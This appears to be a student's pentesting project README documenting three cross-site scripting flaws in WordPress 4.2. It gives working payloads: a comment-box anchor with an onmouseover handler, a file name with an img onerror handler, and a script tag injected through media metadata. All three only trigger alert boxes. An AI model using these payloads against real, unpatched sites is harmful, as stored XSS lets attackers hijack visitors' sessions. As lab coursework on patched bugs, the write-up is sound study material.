# Project 7 - WordPress Pentesting

Time spent: Approximately 10 hours spent in total

> Objective: Find, analyze, recreate, and document affecting an old version of WordPress

## Pentesting Report

1. (Required) WordPress <= 4.2 - Unauthenticated Stored Cross-Site Scripting
  - [x] Summary:
    - Vulnerability types: 	XSS
    - Tested in version: 	4.2 (Released on 04/23/2015)
    - Fixed in version: 	4.2.1
  - [x] GIF Walkthrough: 	exploit1/exploit1.gif
  - [x] Steps to recreate: 	Go to wordpress site and paste this link in the comment box and post.<a title='xonmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>




2. (Required) WordPress 3.3-4.7.4 - Large File Upload Error XSS
  - [x] Summary:
    - Vulnerability types:	XSS
    - Tested in version: 	4.2 (Released on 04/23/2015)
    - Fixed in version: 	4.2.15
  - [x] GIF Walkthrough:	exploit2/exploit2.gif
  - [x] Steps to recreate:	Create a file larger than 20MB in size.
				Rename it to "anyName <img src=x onerror=alert("Exploit2")>.jpg"
				From admin console, upload this file.
				(An error will appear saying file too large, but our exploit will also work and alert box will pop up. This shows the vulnerability that )




3. (Required) WordPress 3.6.0-4.7.2 - Authenticated Cross-Site Scripting via Media File Metadata
  - [x] Summary:
    - Vulnerability types:	XSS
    - Tested in version: 	4.2 (Released on 04/23/2015)
    - Fixed in version:		4.7.3
  - [x] GIF Walkthrough:	exploit3/exploit3.gif
  - [x] Steps to recreate:	Upload a media file containing exploit in form of Metadata.
				If it doesn't contain Metadata already, we can add it in description of the media file on admin console.
				Add "filename </noscript><script>alert("Exploit 3 Successful");</script>" in the description including quotes.
				View attachment page and our alert box will pop up.


## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).

## Notes

Describe any challenges encountered while doing the work

## License

    Copyright [2017] [Arslan Waheed]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
